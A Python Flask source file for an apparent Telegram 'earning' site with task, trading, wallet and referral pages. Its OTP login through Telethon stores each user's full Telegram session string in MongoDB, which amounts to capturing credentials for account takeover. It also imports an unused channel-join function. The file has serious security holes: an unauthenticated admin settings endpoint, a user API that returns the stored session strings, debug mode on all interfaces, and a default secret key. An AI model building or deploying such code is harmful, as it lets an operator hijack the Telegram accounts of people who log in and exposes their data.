import os
import asyncio
from datetime import datetime, timedelta
from functools import wraps

from flask import Flask, request, jsonify, session, render_template, redirect, url_for
from flask_cors import CORS
from pymongo import MongoClient

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.channels import JoinChannelRequest

# ================= CONFIG =================
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "change_this_now")

app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=False,
    PERMANENT_SESSION_LIFETIME=timedelta(days=3)
)

CORS(app)

API_ID = int(os.environ.get("API_ID", "123456"))
API_HASH = os.environ.get("API_HASH", "your_api_hash")
MONGO_URI = os.environ.get("MONGO_URI", "mongodb://localhost:27017")

# ================= DB =================
client = MongoClient(MONGO_URI)
db = client['aaf_tele_earn_db']
users_col = db['users']
settings_col = db['settings']

# ================= HELPERS =================
def run_async(coro):
    return asyncio.run(coro)

def get_admin():
    return settings_col.find_one({"type": "global"}) or {}

# ================= LOGIN CHECK =================
def login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        uid = session.get("uid")

        if not uid:
            return redirect(url_for("login"))

        user = users_col.find_one({"telegram_id": uid})

        if not user:
            session.clear()
            return redirect(url_for("login"))

        # 3 days expiry
        last = user.get("last_login")
        if last and datetime.now() - last > timedelta(days=3):
            session.clear()
            return redirect(url_for("login"))

        return f(*args, **kwargs)
    return wrapper

# ================= LOGIN SYSTEM =================
@app.route('/api/send_otp', methods=['POST'])
def send_otp():
    phone = request.json.get("phone")

    async def main():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        try:
            await client.connect()
            result = await client.send_code_request(phone)

            users_col.update_one(
                {"phone": phone},
                {"$set": {
                    "temp_session": client.session.save(),
                    "phone_code_hash": result.phone_code_hash,
                    "last_otp_time": datetime.now()
                }},
                upsert=True
            )

            return True, "OTP Sent"
        finally:
            await client.disconnect()

    success, msg = run_async(main())
    return jsonify({"success": success, "message": msg})

@app.route('/api/verify_login', methods=['POST'])
def verify_login():
    data = request.json
    phone = data.get("phone")
    code = data.get("code")

    temp = users_col.find_one({"phone": phone})

    async def main():
        client = TelegramClient(
            StringSession(temp["temp_session"]),
            API_ID,
            API_HASH
        )

        try:
            await client.connect()

            user = await client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=temp["phone_code_hash"]
            )

            users_col.update_one(
                {"phone": phone},
                {"$set": {
                    "telegram_id": user.id,
                    "name": f"{user.first_name or ''}",
                    "username": user.username,
                    "session_str": client.session.save(),
                    "last_login": datetime.now()
                }}
            )

            return True, user.id

        except SessionPasswordNeededError:
            return False, "NEED_PASSWORD"
        finally:
            await client.disconnect()

    success, result = run_async(main())

    if success:
        session["uid"] = result
        session.permanent = True
        return jsonify({"success": True})

    return jsonify({"success": False, "message": result})

# ================= USER API =================
@app.route('/api/user')
def get_user():
    uid = session.get("uid")
    user = users_col.find_one({"telegram_id": uid})

    if not user:
        return jsonify({"success": False})

    return jsonify({"success": True, "user": user})

# ================= ADMIN =================
@app.route('/admin')
@login_required
def admin():
    return render_template("admin.html")

@app.route('/admin/update', methods=['POST'])
def admin_update():
    settings_col.update_one(
        {"type": "global"},
        {"$set": request.json},
        upsert=True
    )
    return jsonify({"success": True})

# ================= PAGES =================
@app.route('/')
@app.route('/login')
def login():
    return render_template("login.html")

@app.route('/dashboard')
@login_required
def dashboard():
    user = users_col.find_one({"telegram_id": session["uid"]})
    admin = get_admin()
    return render_template("dashboard.html", user=user, admin=admin)

@app.route('/task')
@login_required
def task():
    return render_template("task.html")

@app.route('/trading')
@login_required
def trading():
    return render_template("trading.html")

@app.route('/wallet')
@login_required
def wallet():
    return render_template("wallet.html")

@app.route('/account')
@login_required
def account():
    return render_template("account.html")

@app.route('/refer_list')
@login_required
def refer_list():
    return render_template("refer_list.html")

@app.route('/payment_history')
@login_required
def payment_history():
    return render_template("payment_history.html")

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for("login"))

# ================= RUN =================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
